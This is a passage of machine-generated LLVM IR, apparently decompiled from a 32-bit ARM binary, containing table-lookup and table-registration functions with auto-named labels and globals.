dec_label_pc_a320:                                ; preds = %dec_label_pc_a310, %dec_label_pc_a3c8, %dec_label_pc_a3e0
  %v0_a320 = phi i32 [ %v0_a318, %dec_label_pc_a310 ], [ %v0_a3d8, %dec_label_pc_a3c8 ], [ %v0_a320.pre, %dec_label_pc_a3e0 ]
  store i32 %v0_a320, i32* @global_var_21310.64, align 4
  %v0_a324 = call i32 @function_1015c()
  store i32 %v0_a324, i32* %r0.global-to-local, align 4
  ret i32 %v0_a324

dec_label_pc_a334:                                ; preds = %dec_label_pc_a294
  %v2_a338 = call i32 @function_12f18(i32 %v2_a29c, i32 9)
  %v3_a33c = load i32, i32* @global_var_212f8.58, align 4
  store i32 %v3_a33c, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  %v2_a344 = icmp eq i32 %v3_a33c, 0
  %v1_a348 = load i32, i32* @r4, align 4
  %v2_a348 = inttoptr i32 %v1_a348 to i32*
  store i32 0, i32* %v2_a348, align 4
  br i1 %v2_a344, label %dec_label_pc_a334.dec_label_pc_a2c0_crit_edge, label %dec_label_pc_a334.dec_label_pc_a350_crit_edge

dec_label_pc_a334.dec_label_pc_a2c0_crit_edge:    ; preds = %dec_label_pc_a334
  %v0_a2c8.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_a2c0

dec_label_pc_a334.dec_label_pc_a350_crit_edge:    ; preds = %dec_label_pc_a334
  %v0_a354.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_a350

dec_label_pc_a350:                                ; preds = %dec_label_pc_a334.dec_label_pc_a350_crit_edge, %dec_label_pc_a2ac
  %v0_a354 = phi i32 [ %v0_a354.pre, %dec_label_pc_a334.dec_label_pc_a350_crit_edge ], [ %v3_a2ac, %dec_label_pc_a2ac ]
  %v2_a354 = call i32 @function_12f18(i32 %v0_a354, i32 9)
  %v3_a358 = load i32, i32* @global_var_212fc.59, align 4
  store i32 %v3_a358, i32* %r0.global-to-local, align 4
  %v2_a35c = icmp eq i32 %v3_a358, 0
  %v0_a360 = load i32, i32* @r5, align 4
  store i32 %v0_a360, i32* @global_var_212f8.58, align 4
  br i1 %v2_a35c, label %dec_label_pc_a2d0, label %dec_label_pc_a368

dec_label_pc_a368:                                ; preds = %dec_label_pc_a2c0, %dec_label_pc_a350
  %v0_a36c = phi i32 [ %v3_a2c0, %dec_label_pc_a2c0 ], [ %v3_a358, %dec_label_pc_a350 ]
  %v2_a36c = call i32 @function_12f18(i32 %v0_a36c, i32 9)
  %v3_a370 = load i32, i32* @global_var_21300.60, align 4
  store i32 %v3_a370, i32* %r0.global-to-local, align 4
  %v2_a374 = icmp eq i32 %v3_a370, 0
  %v0_a378 = load i32, i32* @r5, align 4
  store i32 %v0_a378, i32* @global_var_212fc.59, align 4
  br i1 %v2_a374, label %dec_label_pc_a2e0, label %dec_label_pc_a380

dec_label_pc_a380:                                ; preds = %dec_label_pc_a2d0, %dec_label_pc_a368
  %v0_a384 = phi i32 [ %v3_a2d0, %dec_label_pc_a2d0 ], [ %v3_a370, %dec_label_pc_a368 ]
  %v2_a384 = call i32 @function_12f18(i32 %v0_a384, i32 9)
  %v3_a388 = load i32, i32* @global_var_21304.61, align 4
  store i32 %v3_a388, i32* %r0.global-to-local, align 4
  %v2_a38c = icmp eq i32 %v3_a388, 0
  %v0_a390 = load i32, i32* @r5, align 4
  store i32 %v0_a390, i32* @global_var_21300.60, align 4
  br i1 %v2_a38c, label %dec_label_pc_a2f0, label %dec_label_pc_a398

dec_label_pc_a398:                                ; preds = %dec_label_pc_a2e0, %dec_label_pc_a380
  %v0_a39c = phi i32 [ %v3_a2e0, %dec_label_pc_a2e0 ], [ %v3_a388, %dec_label_pc_a380 ]
  %v2_a39c = call i32 @function_12f18(i32 %v0_a39c, i32 9)
  %v3_a3a0 = load i32, i32* @global_var_21308.62, align 4
  store i32 %v3_a3a0, i32* %r0.global-to-local, align 4
  %v2_a3a4 = icmp eq i32 %v3_a3a0, 0
  %v0_a3a8 = load i32, i32* @r5, align 4
  store i32 %v0_a3a8, i32* @global_var_21304.61, align 4
  br i1 %v2_a3a4, label %dec_label_pc_a300, label %dec_label_pc_a3b0

dec_label_pc_a3b0:                                ; preds = %dec_label_pc_a2f0, %dec_label_pc_a398
  %v0_a3b4 = phi i32 [ %v3_a2f0, %dec_label_pc_a2f0 ], [ %v3_a3a0, %dec_label_pc_a398 ]
  %v2_a3b4 = call i32 @function_12f18(i32 %v0_a3b4, i32 9)
  %v3_a3b8 = load i32, i32* @global_var_2130c.63, align 4
  store i32 %v3_a3b8, i32* %r0.global-to-local, align 4
  %v2_a3bc = icmp eq i32 %v3_a3b8, 0
  %v0_a3c0 = load i32, i32* @r5, align 4
  store i32 %v0_a3c0, i32* @global_var_21308.62, align 4
  br i1 %v2_a3bc, label %dec_label_pc_a310, label %dec_label_pc_a3c8

dec_label_pc_a3c8:                                ; preds = %dec_label_pc_a300, %dec_label_pc_a3b0
  %v0_a3cc = phi i32 [ %v3_a300, %dec_label_pc_a300 ], [ %v3_a3b8, %dec_label_pc_a3b0 ]
  %v2_a3cc = call i32 @function_12f18(i32 %v0_a3cc, i32 9)
  %v3_a3d0 = load i32, i32* @global_var_21310.64, align 4
  store i32 %v3_a3d0, i32* @r0, align 4
  %v2_a3d4 = icmp eq i32 %v3_a3d0, 0
  %v0_a3d8 = load i32, i32* @r5, align 4
  store i32 %v0_a3d8, i32* @global_var_2130c.63, align 4
  br i1 %v2_a3d4, label %dec_label_pc_a320, label %dec_label_pc_a3e0

dec_label_pc_a3e0:                                ; preds = %dec_label_pc_a310, %dec_label_pc_a3c8
  %v0_a3e4 = phi i32 [ %v3_a310, %dec_label_pc_a310 ], [ %v3_a3d0, %dec_label_pc_a3c8 ]
  %v2_a3e4 = call i32 @function_12f18(i32 %v0_a3e4, i32 9)
  store i32 %v2_a3e4, i32* @r0, align 4
  %v0_a320.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_a320

; uselistorder directives
  uselistorder i32 %v0_a3d8, { 1, 0 }
  uselistorder i32 %v0_a3c0, { 1, 0 }
  uselistorder i32 %v0_a3a8, { 1, 0 }
  uselistorder i32 %v0_a390, { 1, 0 }
  uselistorder i32 %v0_a378, { 1, 0 }
  uselistorder i32 %v0_a360, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 14, 7, 8, 9, 10, 11, 12, 13 }
  uselistorder label %dec_label_pc_a3e0, { 1, 0 }
  uselistorder label %dec_label_pc_a3c8, { 1, 0 }
  uselistorder label %dec_label_pc_a3b0, { 1, 0 }
  uselistorder label %dec_label_pc_a398, { 1, 0 }
  uselistorder label %dec_label_pc_a380, { 1, 0 }
  uselistorder label %dec_label_pc_a368, { 1, 0 }
  uselistorder label %dec_label_pc_a320, { 2, 1, 0 }
  uselistorder label %dec_label_pc_a310, { 1, 0 }
  uselistorder label %dec_label_pc_a300, { 1, 0 }
  uselistorder label %dec_label_pc_a2f0, { 1, 0 }
  uselistorder label %dec_label_pc_a2e0, { 1, 0 }
  uselistorder label %dec_label_pc_a2d0, { 1, 0 }
}

define i32 @function_a3f0(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_a3f0:
  %r1.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v2_a3f0 = icmp eq i32 %arg1, 0
  store i32 %arg4, i32* @r4, align 4
  br i1 %v2_a3f0, label %dec_label_pc_a438, label %dec_label_pc_a400

dec_label_pc_a400:                                ; preds = %dec_label_pc_a3f0
  %v0_a400 = load i32, i32* %r1.global-to-local, align 4
  %v1_a400 = add i32 %v0_a400, 4
  %v2_a400 = inttoptr i32 %v1_a400 to i8*
  %v3_a400 = load i8, i8* %v2_a400, align 1
  %v4_a400 = zext i8 %v3_a400 to i32
  %v9_a404 = icmp eq i32 %v4_a400, %arg3
  br i1 %v9_a404, label %dec_label_pc_a444, label %dec_label_pc_a428.preheader

dec_label_pc_a428.preheader:                      ; preds = %dec_label_pc_a400
  br label %dec_label_pc_a428

dec_label_pc_a418:                                ; preds = %dec_label_pc_a428
  %v1_a418 = add i32 %v0_a420.in, 12
  %v2_a418 = inttoptr i32 %v1_a418 to i8*
  %v3_a418 = load i8, i8* %v2_a418, align 1
  %v4_a418 = zext i8 %v3_a418 to i32
  %v9_a41c = icmp eq i32 %v4_a418, %arg3
  br i1 %v9_a41c, label %dec_label_pc_a444, label %dec_label_pc_a428

dec_label_pc_a428:                                ; preds = %dec_label_pc_a428.preheader, %dec_label_pc_a418
  %v0_a420.in = phi i32 [ %v0_a400, %dec_label_pc_a428.preheader ], [ %v0_a420, %dec_label_pc_a418 ]
  %v0_a428 = phi i32 [ 0, %dec_label_pc_a428.preheader ], [ %v1_a428, %dec_label_pc_a418 ]
  %v0_a420 = add i32 %v0_a420.in, 8
  %v1_a428 = add i32 %v0_a428, 1
  %v9_a42c = icmp eq i32 %v1_a428, %arg1
  store i32 %v0_a420, i32* %r1.global-to-local, align 4
  br i1 %v9_a42c, label %dec_label_pc_a438, label %dec_label_pc_a418

dec_label_pc_a438:                                ; preds = %dec_label_pc_a428, %dec_label_pc_a444, %dec_label_pc_a3f0, %dec_label_pc_a450
  %v0_a438 = phi i32 [ %arg4, %dec_label_pc_a444 ], [ %arg4, %dec_label_pc_a3f0 ], [ %v1_a450, %dec_label_pc_a450 ], [ %arg4, %dec_label_pc_a428 ]
  ret i32 %v0_a438

dec_label_pc_a444:                                ; preds = %dec_label_pc_a418, %dec_label_pc_a400
  %v0_a444 = phi i32 [ %v0_a400, %dec_label_pc_a400 ], [ %v0_a420, %dec_label_pc_a418 ]
  %v1_a444 = inttoptr i32 %v0_a444 to i32*
  %v2_a444 = load i32, i32* %v1_a444, align 4
  store i32 %v2_a444, i32* @r0, align 4
  %v2_a448 = icmp eq i32 %v2_a444, 0
  br i1 %v2_a448, label %dec_label_pc_a438, label %dec_label_pc_a450

dec_label_pc_a450:                                ; preds = %dec_label_pc_a444
  %v1_a450 = call i32 @function_13690(i32 %v2_a444)
  br label %dec_label_pc_a438

; uselistorder directives
  uselistorder i32 %v1_a428, { 1, 0 }
  uselistorder i32 %v0_a420, { 1, 0, 2 }
  uselistorder i32 %v0_a420.in, { 1, 0 }
  uselistorder i32 %v0_a400, { 1, 0, 2 }
  uselistorder i32* %r1.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_a438, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_a428, { 1, 0 }
}

define i32 @function_a45c(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_a45c:
  %r1.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v2_a45c = icmp eq i32 %arg1, 0
  %v3_a460 = load i32, i32* @r4, align 4
  store i32 %v3_a460, i32* %stack_var_-8, align 4
  %v6_a460 = load i32, i32* @lr, align 4
  store i32 %arg4, i32* @r4, align 4
  br i1 %v2_a45c, label %dec_label_pc_a4a4, label %dec_label_pc_a46c

dec_label_pc_a46c:                                ; preds = %dec_label_pc_a45c
  %v0_a46c = load i32, i32* %r1.global-to-local, align 4
  %v1_a46c = add i32 %v0_a46c, 4
  %v2_a46c = inttoptr i32 %v1_a46c to i8*
  %v3_a46c = load i8, i8* %v2_a46c, align 1
  %v4_a46c = zext i8 %v3_a46c to i32
  %v9_a470 = icmp eq i32 %v4_a46c, %arg3
  br i1 %v9_a470, label %dec_label_pc_a4b0, label %dec_label_pc_a494.preheader

dec_label_pc_a494.preheader:                      ; preds = %dec_label_pc_a46c
  br label %dec_label_pc_a494

dec_label_pc_a484:                                ; preds = %dec_label_pc_a494
  %v1_a484 = add i32 %v0_a48c.in, 12
  %v2_a484 = inttoptr i32 %v1_a484 to i8*
  %v3_a484 = load i8, i8* %v2_a484, align 1
  %v4_a484 = zext i8 %v3_a484 to i32
  %v9_a488 = icmp eq i32 %v4_a484, %arg3
  br i1 %v9_a488, label %dec_label_pc_a4b0, label %dec_label_pc_a494

dec_label_pc_a494:                                ; preds = %dec_label_pc_a494.preheader, %dec_label_pc_a484
  %v0_a48c.in = phi i32 [ %v0_a46c, %dec_label_pc_a494.preheader ], [ %v0_a48c, %dec_label_pc_a484 ]
  %v0_a494 = phi i32 [ 0, %dec_label_pc_a494.preheader ], [ %v1_a494, %dec_label_pc_a484 ]
  %v0_a48c = add i32 %v0_a48c.in, 8
  %v1_a494 = add i32 %v0_a494, 1
  store i32 %v1_a494, i32* @lr, align 4
  %v9_a498 = icmp eq i32 %v1_a494, %arg1
  store i32 %v0_a48c, i32* %r1.global-to-local, align 4
  br i1 %v9_a498, label %dec_label_pc_a4a4, label %dec_label_pc_a484

dec_label_pc_a4a4:                                ; preds = %dec_label_pc_a494, %dec_label_pc_a4b0, %dec_label_pc_a45c, %dec_label_pc_a4bc
  %v2_a4a8 = phi i32 [ %v3_a460, %dec_label_pc_a4b0 ], [ %v3_a460, %dec_label_pc_a45c ], [ %v2_a4a8.pre, %dec_label_pc_a4bc ], [ %v3_a460, %dec_label_pc_a494 ]
  %v0_a4a4 = phi i32 [ %arg4, %dec_label_pc_a4b0 ], [ %arg4, %dec_label_pc_a45c ], [ %v3_a4c0, %dec_label_pc_a4bc ], [ %arg4, %dec_label_pc_a494 ]
  store i32 %v2_a4a8, i32* @r4, align 4
  store i32 %v6_a460, i32* @lr, align 4
  ret i32 %v0_a4a4

dec_label_pc_a4b0:                                ; preds = %dec_label_pc_a484, %dec_label_pc_a46c
  %v0_a4b0 = phi i32 [ %v0_a46c, %dec_label_pc_a46c ], [ %v0_a48c, %dec_label_pc_a484 ]
  %v1_a4b0 = inttoptr i32 %v0_a4b0 to i32*
  %v2_a4b0 = load i32, i32* %v1_a4b0, align 4
  %v2_a4b4 = icmp eq i32 %v2_a4b0, 0
  br i1 %v2_a4b4, label %dec_label_pc_a4a4, label %dec_label_pc_a4bc

dec_label_pc_a4bc:                                ; preds = %dec_label_pc_a4b0
  store i32 10, i32* %r1.global-to-local, align 4
  %v2_a4c0 = inttoptr i32 %v2_a4b0 to i8*
  %v3_a4c0 = call i32 @function_125a4(i8* %v2_a4c0, i32 10)
  %v2_a4a8.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_a4a4

; uselistorder directives
  uselistorder i32 %v1_a494, { 1, 2, 0 }
  uselistorder i32 %v0_a48c, { 1, 0, 2 }
  uselistorder i32 %v0_a48c.in, { 1, 0 }
  uselistorder i32 %v0_a46c, { 1, 0, 2 }
  uselistorder i32* %r1.global-to-local, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_a4a4, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_a494, { 1, 0 }
}

define i32 @function_a4cc(i32 %arg1) local_unnamed_addr {
dec_label_pc_a4cc:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v2_a4dc = call i32 @function_144a8(i32 1, i32 8)
  store i32 ptrtoint (i8** @global_var_212ec.51 to i32), i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_212f0.53 to i32), i32* @r6, align 4
  store i32 52408, i32* %r2.global-to-local, align 4
  store i32 %v2_a4dc, i32* @r4, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i8* @global_var_212ed.68 to i32), i32* %r1.global-to-local, align 4
  %v2_a4fc = load i32, i32* @global_var_212f0.53, align 4
  %v2_a500 = inttoptr i32 %v2_a4dc to i32*
  store i32 52408, i32* %v2_a500, align 4
  %v3_a504 = load i32, i32* @r4, align 4
  %v4_a504 = add i32 %v3_a504, 4
  %v5_a504 = inttoptr i32 %v4_a504 to i8*
  store i8 0, i8* %v5_a504, align 1
  %v0_a508 = load i32, i32* %r1.global-to-local, align 4
  %v3_a508 = mul i32 %v0_a508, 4
  store i32 %v3_a508, i32* %r1.global-to-local, align 4
  %v5_a50c = inttoptr i32 %v2_a4fc to i32*
  %v6_a50c = call i32 @function_145dc(i32* %v5_a50c, i32 %v3_a508, i32 52408, i32 0)
  %v2_a510 = load i8, i8* bitcast (i8** @global_var_212ec.51 to i8*), align 4
  %v3_a510 = zext i8 %v2_a510 to i32
  store i32 %v6_a50c, i32* %r2.global-to-local, align 4
  %v0_a518 = load i32, i32* @r4, align 4
  %v5_a518 = mul nuw nsw i32 %v3_a510, 4
  %v6_a518 = add i32 %v5_a518, %v6_a50c
  %v7_a518 = inttoptr i32 %v6_a518 to i32*
  store i32 %v0_a518, i32* %v7_a518, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i8* @global_var_212ed.68 to i32), i32* %r3.global-to-local, align 4
  %v1_a528 = load i32, i32* @r6, align 4
  %v2_a528 = inttoptr i32 %v1_a528 to i32*
  store i32 %v6_a50c, i32* %v2_a528, align 4
  %v0_a52c = load i32, i32* %r3.global-to-local, align 4
  %v1_a52c = trunc i32 %v0_a52c to i8
  %v2_a52c = load i32, i32* @r5, align 4
  %v3_a52c = inttoptr i32 %v2_a52c to i8*
  store i8 %v1_a52c, i8* %v3_a52c, align 1
  %v2_a530 = call i32 @function_144a8(i32 1, i32 8)
  store i32 ptrtoint (i32* @global_var_d1a4.70 to i32), i32* %r3.global-to-local, align 4
  store i32 1, i32* @r7, align 4
  store i32 %v2_a530, i32* @r4, align 4
  store i32 ptrtoint (i8* @global_var_212ed.68 to i32), i32* %r1.global-to-local, align 4
  %v2_a548 = load i32, i32* @global_var_212f0.53, align 4
  %v2_a54c = inttoptr i32 %v2_a530 to i32*
  store i32 ptrtoint (i32* @global_var_d1a4.70 to i32), i32* %v2_a54c, align 4
  %v0_a550 = load i32, i32* @r7, align 4
  %v1_a550 = trunc i32 %v0_a550 to i8
  %v2_a550 = load i32, i32* @r4, align 4
  %v3_a550 = add i32 %v2_a550, 4
  %v4_a550 = inttoptr i32 %v3_a550 to i8*
  store i8 %v1_a550, i8* %v4_a550, align 1
  %v0_a554 = load i32, i32* %r1.global-to-local, align 4
  %v3_a554 = mul i32 %v0_a554, 4
  store i32 %v3_a554, i32* %r1.global-to-local, align 4
  %v4_a558 = inttoptr i32 %v2_a548 to i32*
  %v5_a558 = call i32 @function_145dc(i32* %v4_a558, i32 %v3_a554, i32 %v6_a50c, i32 ptrtoint (i32* @global_var_d1a4.70 to i32))
  %v2_a55c = load i8, i8* bitcast (i8** @global_var_212ec.51 to i8*), align 4
  %v3_a55c = zext i8 %v2_a55c to i32
  store i32 %v3_a55c, i32* %r3.global-to-local, align 4
  store i32 %v5_a558, i32* %r2.global-to-local, align 4
  %v0_a564 = load i32, i32* @r4, align 4
  %v5_a564 = mul nuw nsw i32 %v3_a55c, 4
  %v6_a564 = add i32 %v5_a564, %v5_a558
  %v7_a564 = inttoptr i32 %v6_a564 to i32*
  store i32 %v0_a564, i32* %v7_a564, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v0_a56c = load i32, i32* %r3.global-to-local, align 4
  %v1_a56c = load i32, i32* @r7, align 4
  %v2_a56c = add i32 %v1_a56c, %v0_a56c
  store i32 %v2_a56c, i32* %r3.global-to-local, align 4
  %v1_a574 = trunc i32 %v2_a56c to i8
  %v2_a574 = load i32, i32* @r5, align 4
  %v3_a574 = inttoptr i32 %v2_a574 to i8*
  store i8 %v1_a574, i8* %v3_a574, align 1
  %v0_a578 = load i32, i32* %r2.global-to-local, align 4
  %v1_a578 = load i32, i32* @r6, align 4
  %v2_a578 = inttoptr i32 %v1_a578 to i32*
  store i32 %v0_a578, i32* %v2_a578, align 4
  %v2_a57c = call i32 @function_144a8(i32 %v1_a56c, i32 8)
  %v2_a580 = load i8, i8* bitcast (i8** @global_var_212ec.51 to i8*), align 4
  %v3_a580 = zext i8 %v2_a580 to i32
  store i32 ptrtoint (i32* @global_var_d5dc.72 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_a57c, i32* @r4, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v1_a590 = load i32, i32* @r7, align 4
  %v2_a590 = add i32 %v1_a590, %v3_a580
  store i32 %v2_a590, i32* %r1.global-to-local, align 4
  %v2_a594 = load i32, i32* @global_var_212f0.53, align 4
  %v2_a598 = inttoptr i32 %v2_a57c to i32*
  store i32 ptrtoint (i32* @global_var_d5dc.72 to i32), i32* %v2_a598, align 4
  %v3_a59c = load i32, i32* @r4, align 4
  %v4_a59c = add i32 %v3_a59c, 4
  %v5_a59c = inttoptr i32 %v4_a59c to i8*
  store i8 2, i8* %v5_a59c, align 1
  %v0_a5a0 = load i32, i32* %r1.global-to-local, align 4
  %v3_a5a0 = mul i32 %v0_a5a0, 4
  store i32 %v3_a5a0, i32* %r1.global-to-local, align 4
  %v5_a5a4 = inttoptr i32 %v2_a594 to i32*
  %v6_a5a4 = call i32 @function_145dc(i32* %v5_a5a4, i32 %v3_a5a0, i32 ptrtoint (i32* @global_var_d5dc.72 to i32), i32 2)
  %v2_a5a8 = load i8, i8* bitcast (i8** @global_var_212ec.51 to i8*), align 4
  %v3_a5a8 = zext i8 %v2_a5a8 to i32
  store i32 %v3_a5a8, i32* %r3.global-to-local, align 4
  store i32 %v6_a5a4, i32* %r2.global-to-local, align 4
  %v0_a5b0 = load i32, i32* @r4, align 4
  %v5_a5b0 = mul nuw nsw i32 %v3_a5a8, 4
  %v6_a5b0 = add i32 %v5_a5b0, %v6_a5a4
  %v7_a5b0 = inttoptr i32 %v6_a5b0 to i32*
  store i32 %v0_a5b0, i32* %v7_a5b0, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v0_a5b8 = load i32, i32* %r3.global-to-local, align 4
  %v1_a5b8 = load i32, i32* @r7, align 4
  %v2_a5b8 = add i32 %v1_a5b8, %v0_a5b8
  store i32 %v2_a5b8, i32* %r3.global-to-local, align 4
  %v1_a5c0 = trunc i32 %v2_a5b8 to i8
  %v2_a5c0 = load i32, i32* @r5, align 4
  %v3_a5c0 = inttoptr i32 %v2_a5c0 to i8*
  store i8 %v1_a5c0, i8* %v3_a5c0, align 1
  %v0_a5c4 = load i32, i32* %r2.global-to-local, align 4
  %v1_a5c4 = load i32, i32* @r6, align 4
  %v2_a5c4 = inttoptr i32 %v1_a5c4 to i32*
  store i32 %v0_a5c4, i32* %v2_a5c4, align 4
  %v2_a5c8 = call i32 @function_144a8(i32 %v1_a5b8, i32 8)
  %v2_a5cc = load i8, i8* bitcast (i8** @global_var_212ec.51 to i8*), align 4
  %v3_a5cc = zext i8 %v2_a5cc to i32
  store i32 ptrtoint (i32* @global_var_ca18.74 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_a5c8, i32* @r4, align 4
  store i32 9, i32* %r3.global-to-local, align 4
  %v1_a5dc = load i32, i32* @r7, align 4
  %v2_a5dc = add i32 %v1_a5dc, %v3_a5cc
  store i32 %v2_a5dc, i32* %r1.global-to-local, align 4
  %v2_a5e0 = load i32, i32* @global_var_212f0.53, align 4
  %v2_a5e4 = inttoptr i32 %v2_a5c8 to i32*
  store i32 ptrtoint (i32* @global_var_ca18.74 to i32), i32* %v2_a5e4, align 4
  %v3_a5e8 = load i32, i32* @r4, align 4
  %v4_a5e8 = add i32 %v3_a5e8, 4
  %v5_a5e8 = inttoptr i32 %v4_a5e8 to i8*
  store i8 9, i8* %v5_a5e8, align 1
  %v0_a5ec = load i32, i32* %r1.global-to-local, align 4
  %v3_a5ec = mul i32 %v0_a5ec, 4
  store i32 %v3_a5ec, i32* %r1.global-to-local, align 4
  %v5_a5f0 = inttoptr i32 %v2_a5e0 to i32*
  %v6_a5f0 = call i32 @function_145dc(i32* %v5_a5f0, i32 %v3_a5ec, i32 ptrtoint (i32* @global_var_ca18.74 to i32), i32 9)
  %v2_a5f4 = load i8, i8* bitcast (i8** @global_var_212ec.51 to i8*), align 4
  %v3_a5f4 = zext i8 %v2_a5f4 to i32
  store i32 %v3_a5f4, i32* %r3.global-to-local, align 4
  store i32 %v6_a5f0, i32* %r2.global-to-local, align 4
  %v0_a5fc = load i32, i32* @r4, align 4
  %v5_a5fc = mul nuw nsw i32 %v3_a5f4, 4
  %v6_a5fc = add i32 %v5_a5fc, %v6_a5f0
  %v7_a5fc = inttoptr i32 %v6_a5fc to i32*
  store i32 %v0_a5fc, i32* %v7_a5fc, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v0_a604 = load i32, i32* %r3.global-to-local, align 4
  %v1_a604 = load i32, i32* @r7, align 4
  %v2_a604 = add i32 %v1_a604, %v0_a604
  store i32 %v2_a604, i32* %r3.global-to-local, align 4
  %v1_a60c = trunc i32 %v2_a604 to i8
  %v2_a60c = load i32, i32* @r5, align 4
  %v3_a60c = inttoptr i32 %v2_a60c to i8*
  store i8 %v1_a60c, i8* %v3_a60c, align 1
  %v0_a610 = load i32, i32* %r2.global-to-local, align 4
  %v1_a610 = load i32, i32* @r6, align 4
  %v2_a610 = inttoptr i32 %v1_a610 to i32*
  store i32 %v0_a610, i32* %v2_a610, align 4
  %v2_a614 = call i32 @function_144a8(i32 %v1_a604, i32 8)
  %v2_a618 = load i8, i8* bitcast (i8** @global_var_212ec.51 to i8*), align 4
  %v3_a618 = zext i8 %v2_a618 to i32
  store i32 ptrtoint (i32* @global_var_c36c.76 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_a614, i32* @r4, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  %v1_a628 = load i32, i32* @r7, align 4
  %v2_a628 = add i32 %v1_a628, %v3_a618
  store i32 %v2_a628, i32* %r1.global-to-local, align 4
  %v2_a62c = load i32, i32* @global_var_212f0.53, align 4
  %v2_a630 = inttoptr i32 %v2_a614 to i32*
  store i32 ptrtoint (i32* @global_var_c36c.76 to i32), i32* %v2_a630, align 4
  %v3_a634 = load i32, i32* @r4, align 4
  %v4_a634 = add i32 %v3_a634, 4
  %v5_a634 = inttoptr i32 %v4_a634 to i8*
  store i8 3, i8* %v5_a634, align 1
  %v0_a638 = load i32, i32* %r1.global-to-local, align 4
  %v3_a638 = mul i32 %v0_a638, 4
  store i32 %v3_a638, i32* %r1.global-to-local, align 4
  %v5_a63c = inttoptr i32 %v2_a62c to i32*
  %v6_a63c = call i32 @function_145dc(i32* %v5_a63c, i32 %v3_a638, i32 ptrtoint (i32* @global_var_c36c.76 to i32), i32 3)
  %v2_a640 = load i8, i8* bitcast (i8** @global_var_212ec.51 to i8*), align 4
  %v3_a640 = zext i8 %v2_a640 to i32
  store i32 %v3_a640, i32* %r3.global-to-local, align 4
  store i32 %v6_a63c, i32* %r2.global-to-local, align 4
  %v0_a648 = load i32, i32* @r4, align 4
  %v5_a648 = mul nuw nsw i32 %v3_a640, 4
  %v6_a648 = add i32 %v5_a648, %v6_a63c
  %v7_a648 = inttoptr i32 %v6_a648 to i32*
  store i32 %v0_a648, i32* %v7_a648, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v0_a650 = load i32, i32* %r3.global-to-local, align 4
  %v1_a650 = load i32, i32* @r7, align 4
  %v2_a650 = add i32 %v1_a650, %v0_a650
  store i32 %v2_a650, i32* %r3.global-to-local, align 4
  %v1_a658 = trunc i32 %v2_a650 to i8
  %v2_a658 = load i32, i32* @r5, align 4
  %v3_a658 = inttoptr i32 %v2_a658 to i8*
  store i8 %v1_a658, i8* %v3_a658, align 1
  %v0_a65c = load i32, i32* %r2.global-to-local, align 4
  %v1_a65c = load i32, i32* @r6, align 4
  %v2_a65c = inttoptr i32 %v1_a65c to i32*
  store i32 %v0_a65c, i32* %v2_a65c, align 4
  %v2_a660 = call i32 @function_144a8(i32 %v1_a650, i32 8)
  %v2_a664 = load i8, i8* bitcast (i8** @global_var_212ec.51 to i8*), align 4
  %v3_a664 = zext i8 %v2_a664 to i32
  store i32 ptrtoint (i32* @global_var_bc74.78 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_a660, i32* @r4, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  %v1_a674 = load i32, i32* @r7, align 4
  %v2_a674 = add i32 %v1_a674, %v3_a664
  store i32 %v2_a674, i32* %r1.global-to-local, align 4
  %v2_a678 = load i32, i32* @global_var_212f0.53, align 4
  %v2_a67c = inttoptr i32 %v2_a660 to i32*
  store i32 ptrtoint (i32* @global_var_bc74.78 to i32), i32* %v2_a67c, align 4
  %v3_a680 = load i32, i32* @r4, align 4
  %v4_a680 = add i32 %v3_a680, 4
  %v5_a680 = inttoptr i32 %v4_a680 to i8*
  store i8 4, i8* %v5_a680, align 1
  %v0_a684 = load i32, i32* %r1.global-to-local, align 4
  %v3_a684 = mul i32 %v0_a684, 4
  store i32 %v3_a684, i32* %r1.global-to-local, align 4
  %v5_a688 = inttoptr i32 %v2_a678 to i32*
  %v6_a688 = call i32 @function_145dc(i32* %v5_a688, i32 %v3_a684, i32 ptrtoint (i32* @global_var_bc74.78 to i32), i32 4)
  %v2_a68c = load i8, i8* bitcast (i8** @global_var_212ec.51 to i8*), align 4
  %v3_a68c = zext i8 %v2_a68c to i32
  store i32 %v3_a68c, i32* %r3.global-to-local, align 4
  store i32 %v6_a688, i32* %r2.global-to-local, align 4
  %v0_a694 = load i32, i32* @r4, align 4
  %v5_a694 = mul nuw nsw i32 %v3_a68c, 4
  %v6_a694 = add i32 %v5_a694, %v6_a688
  %v7_a694 = inttoptr i32 %v6_a694 to i32*
  store i32 %v0_a694, i32* %v7_a694, align 4
  store i32 8, i32* %r1.global-to-local, align 4
